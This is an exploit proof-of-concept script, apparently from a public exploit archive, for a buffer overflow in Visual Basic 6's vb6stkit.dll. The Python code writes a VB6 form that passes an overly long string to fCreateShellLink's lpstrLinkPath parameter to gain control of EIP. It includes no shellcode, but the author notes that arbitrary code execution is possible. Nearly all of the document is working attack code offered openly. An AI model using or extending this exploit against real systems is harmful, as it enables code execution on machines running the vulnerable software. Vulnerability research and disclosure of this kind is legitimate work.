-----------------------------------------------------------------------------
 Visual Basic Enterprise Edition SP6 vb6skit.dll Buffer Overflow
 url: http://www.microsoft.com

 Author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 This was written for educational purpose. Use it at your own risk.
 Author will be not responsible for any damage.
-----------------------------------------------------------------------------
# usage exploit.py

print 'Visual Basic Enterprise Edition SP6 vb6skit.dll Buffer Overflow\n'
print 'Description\n'
print 'vb6stkit.dll is a module that contains application programming'
print 'interface (API) functions that enable Visual Basic applications'
print 'to create shortcuts (Shell Links) programmatically.'
print 'In this poc we will create a form containing an overly long string'
print 'that we pass to the third parameter (lpstrLinkPath) to own EIP.\n'
print 'Arbitraty code execution is possible but today I drank a lot of'
print 'wine therefore I was unable to write an exploit :-D'

Form1 = (
    'VERSION 5.00\n'
    'Begin VB.Form Form1\n'
    '   Caption         =   "Form1"\n'
    '   ClientHeight    =   3195\n'
    '   ClientLeft      =   60\n'
    '   ClientTop       =   345\n'
    '   ClientWidth     =   4680\n'
    '   LinkTopic       =   "Form1"\n'
    '   ScaleHeight     =   3195\n'
    '   ScaleWidth      =   4680\n'
    '   StartUpPosition =   3\n'
    'End\n'
    'Attribute VB_Name = "Form1"\n'
    'Attribute VB_GlobalNameSpace = False\n'
    'Attribute VB_Creatable = False\n'
    'Attribute VB_PredeclaredId = True\n'
    'Attribute VB_Exposed = False\n'
    'Private Declare Function fCreateShellLink Lib "vb6stkit.dll" (ByVal lpstrFolderName As String, ByVal lpstrLinkName As String, ByVal lpstrLinkPath As String, ByVal lpstrLinkArguments As String, ByVal fPrivate As Long, ByVal sParent As String) As Long\n\n'
    'Private Sub Form_Load()\n'
    '    mStr = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n'
    '           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\n\n'
    '    strLinkPath = "c:\" & mStr\n'
    '    fSuccess = fCreateShellLink("..\..\Desktop", "something", strLinkPath, "", True, "$(Programs)")\n\n'
    '    If fSuccess Then\n'
    '        MsgBox "Created desktop shortcut"\n'
    '    Else\n'
    '        MsgBox "Unable to create desktop shortcut"\n'
    '    End If\n'
    'End Sub\n'
    )
try:
    out_file = open("Form1.frm",'w')
    out_file.write(Form1)
    out_file.close()
    print "\nFILE CREATION COMPLETED!\n"
except:
    print " \n -------------------------------------"
    print "  Usage: exploit.py"
    print " -------------------------------------"
    print "\nAN ERROR OCCURS DURING FILE CREATION!"